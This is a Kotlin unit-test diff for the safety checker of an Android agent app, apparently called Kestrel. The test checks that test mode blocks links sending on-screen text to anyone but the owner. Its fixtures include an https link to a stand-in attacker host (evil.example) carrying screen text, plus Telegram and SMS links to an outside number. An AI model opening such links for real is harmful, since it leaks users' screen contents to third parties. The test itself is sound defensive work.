@@ -622,6 +622,30 @@ class SafetyCheckTest {
     }
 
     @Test
+    fun testModeJudgesALinkByWhereItGoesNotByTheOwnersChatInFront() {
+        val testMode = SafetySettings(ownerEmails = listOf("owner@example.com"))
+        val (fixture, fixtureSend) = telegramChat("dev.kestrel.testapp", "Saved Messages", null)
+        val aliases = SafetyEnvironment(selfChatAliases = mapOf("dev.kestrel.testapp" to SelfChats.TELEGRAM))
+        fun link(url: String, target: String) =
+            Proposal("open_link", if (url.startsWith("https")) ActionKind.OPEN_URL else ActionKind.OPEN_DEEP_LINK, link = url, linkTargetPackage = target)
+
+        for (proposal in listOf(
+            link("https://evil.example/c?d=Pasted%20from%20the%20screen", "com.android.chrome"),
+            link("tg://msg?text=x&to=%2B12025550143", "org.telegram.messenger"),
+            link("sms:+12025550143?body=Pasted%20from%20the%20screen", "com.google.android.apps.messaging"),
+        )) {
+            val assessed = SafetyCheck.assess(proposal, fixture.snapshot(), everything, testMode, aliases)
+            assertEquals(proposal.link, Category.SENDING, assessed.category)
+            assertEquals(proposal.link, "Test mode: Kestrel only sends to your own chats.", (assessed.decision as Decision.Block).reason)
+            assertEquals(proposal.link, false, SafetyCheck.testModeAllows(proposal, fixture.snapshot(), everything, testMode, aliases))
+        }
+        val own = link("mailto:owner@example.com?body=Pasted%20from%20the%20screen", "com.google.android.gm")
+        assertEquals("confirm", kind(SafetyCheck.decide(own, fixture.snapshot(), everything, testMode, aliases)))
+        assertEquals(true, SafetyCheck.testModeAllows(own, fixture.snapshot(), everything, testMode, aliases))
+        assertEquals("confirm", kind(SafetyCheck.decide(tap(fixtureSend), fixture.snapshot(), everything, testMode, aliases)))
+    }
+
+    @Test
     fun aGeoOrHttpsLinkWhoseQueryHoldsOnlyTheOwnersWordsOrAMemoryValueReadsInEveryMode() {
         val home = TestScreen("com.google.android.apps.nexuslauncher")
         fun link(url: String, target: String) =
